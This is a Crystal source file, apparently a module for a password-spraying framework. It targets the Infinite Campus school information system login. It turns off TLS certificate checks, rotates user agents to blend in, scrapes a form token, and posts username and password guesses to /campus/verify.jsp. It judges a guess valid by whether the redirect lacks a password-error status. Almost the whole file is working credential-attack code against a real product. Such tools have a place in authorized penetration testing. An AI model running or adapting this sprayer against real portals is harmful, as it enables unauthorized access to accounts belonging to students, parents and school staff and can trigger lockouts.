require "http/client"
require "crystagiri"

class InfinateCampus < Sprayer

    ## only uncomment if needed
    # def initialize(usernames : Array(String), password : Array(String))
    #     # init any special or default variables here
    #     super()
    # end

    # returns an array of [username, password, valid, lockout, mfa]
    def spray(username : String, password : String) 
        lockedout = false
        valid = false
        mfa = false

        # 
        # YOUR CODE BELOW 
        #

        # some basic setups for web based auth 
        url = URI.parse @target 
        #gotta set no verify for tls pages
        context = OpenSSL::SSL::Context::Client.new
        context.verify_mode = OpenSSL::SSL::VerifyMode::NONE
        # create a http client 
        client = HTTP::Client.new(url, tls: context)
        # and some basic header options
        header = HTTP::Headers{ # headers for post request 
            # "User-Agent" => "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
            "User-Agent" => @useragents[rand(0..(@useragents.size - 1))],
            "Accept" => "*/*",
            "Accept-Language" => "en-US,en;q=0.5",
            "Accept-Encoding" => "gzip, deflate",
            "Content-Type" => "application/x-www-form-urlencoded",
            "Origin" => "https://#{url.host}",
            "Referer" => "https://#{url.host}#{url.path}"
        }




        resp = client.get(url.path)
        app_id = ""
        cg = Crystagiri::HTML.new(resp.body)
        n = cg.at_css("input")
        if n 
            app_id = URI.encode_www_form(n.node.attributes["value"].content)
        else 
            raise "bad http parse error"
        end
        







        form = "appName=#{app_id}&screen=&username=#{URI.encode_www_form(username)}&password=#{URI.encode_www_form(password)}&useCSRFProtection=true"
        
        # here is the basic 
        page = client.post("/campus/verify.jsp", headers: header, form: form)
        # page = client.post("#{url.path}", headers: header, form: form)
        # puts page.headers["Location"]
        if !page.headers["Location"].includes? "status=password-error"
            valid = true 
        # elsif page.status_code != 302
        #     STDERR.puts "Something went wrong.... not a 302"
        end




        #
        # end of your CODE make sure you set valid lockedout and mfa 
        # 
        
        return [username, password, valid, lockedout, mfa]
    end
end